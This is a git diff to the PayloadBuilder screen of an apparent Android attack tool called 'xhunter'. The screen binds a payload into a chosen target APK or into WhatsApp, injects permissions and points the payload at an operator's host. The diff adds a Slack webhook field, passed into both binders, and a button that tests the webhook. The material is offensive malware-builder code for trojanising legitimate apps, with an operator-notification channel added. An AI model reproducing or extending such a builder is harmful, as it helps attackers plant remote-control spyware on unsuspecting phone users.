@@ -38,7 +38,8 @@ import AppBuilder from '../../native-modules/AppBuilder'
  const ERRORS={
     payloadError:false,
     serverError:false,
-    hostError:false
+    hostError:false,
+    hookError:false
 
  }       
 
@@ -54,6 +55,9 @@ const PayloadBuilder = ({navigation}) => {
     });
     const [error,setError]=useState(ERRORS);
     const [injectPermission,setInjectPermission]=useState(false);
+    const [slackHook,setSlackHook]=useState("");
+    const [isLoading,setIsLoading]=useState(false);
+
 
     const [visible, setVisible]= useState(false);
     const { subdomain } = useSelector((state) => state.userInfo);
@@ -87,7 +91,7 @@ const handleBuilder=async()=>{
         if (granted) {
             if(config.payloadType=='whatsapp'){
                 setVisible(true);
-                AppBuilder.bindWhatsapp(config.host)
+                AppBuilder.bindWhatsapp(config.host,slackHook)
             }else if(config.payloadType=='bind'){
                 buildBind();
             }
@@ -108,7 +112,7 @@ const buildBind = async()=>{
         RNFetchBlob.fs.stat(config.targetApk.uri).then((stats) => { 
             if(stats.path){
                 setVisible(true)
-                AppBuilder.bindApp(stats.path, config.host, injectPermission)
+                AppBuilder.bindApp(stats.path, config.host, injectPermission, slackHook)
             }else{
                 toast.show({
                     title: "Target apk selected corrupt",
@@ -177,6 +181,34 @@ const requestPermission=async() =>{
           } 
         } catch (err) { } 
  }
+
+ const checkSlackWebHook= ()=>{
+    setIsLoading(true);
+    if(isUrlValid(slackHook)){
+        fetch(slackHook, {
+            method: 'POST',
+            headers: {
+                Accept: 'application/json',
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ text: 'test message from xhunter'})
+            }).then((response) => {
+               if(response.ok){
+                toast.show({ title: "Message sent success!", status: "success", placement: "top"})
+               }else{
+                toast.show({ title:  "Message sent failed!", status: "error", placement: "top", description:"Please check your web hook url and try again."})
+               } 
+             setIsLoading(false);
+            }).catch((error) => {
+                setIsLoading(false);
+                toast.show({ title: error, status: "error", placement: "top"})
+              }); 
+    }else{
+        setIsLoading(false);
+        toast.show({ title: "Invalid Slack Web Hook Url ", status: "error",placement: "top"})
+    }
+ }
+
   return (
     <>
     <StatusBar translucent backgroundColor={"transparent"} barStyle="light-content" />
@@ -264,6 +296,33 @@ const requestPermission=async() =>{
             <FormControl.ErrorMessage leftIcon={ <Icon as={MaterialIcons} name={'warning'} color={"warning.400"} size="xs"/>}>
              Please enter valid url
             </FormControl.ErrorMessage>
+        </FormControl>
+        <FormControl isInvalid={error.hookError} > 
+            <FormControl.Label>Slack Hook (optional)
+            <Link href={"https://api.slack.com/messaging/webhooks"} isExternal>
+                <HStack alignItems="center" ml={2}>
+                    <Badge colorScheme="darkBlue" _text={{ color: "white"}} variant="solid" rounded="4">
+                        {"How to setup slack webhook?"}
+                    </Badge>
+                </HStack>
+            </Link>
+            </FormControl.Label>
+            <Input 
+                placeholder={"https://hooks.slack.com/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX"}
+                variant={'filled'}
+                value={slackHook}
+                onChangeText={setSlackHook}
+                InputLeftElement={<Icon as={<MaterialCommunityIcons name="web" />} size={5} ml="2"  color="muted.400" />}
+                InputRightElement={<Button
+                    size="xs" isLoading={isLoading}
+                    colorScheme={'tertiary'} 
+                    rounded="none" w="1/6" h="full" 
+                    onPress={checkSlackWebHook}> {"Test"} </Button>}
+                />
+            <FormControl.ErrorMessage leftIcon={ <Icon as={MaterialIcons} name={'warning'} color={"warning.400"} size="xs"/>}>
+             Please enter valid url
+            </FormControl.ErrorMessage>
+
         </FormControl>
             {config.payloadType=="bind"?<Checkbox 
                 mt={4}
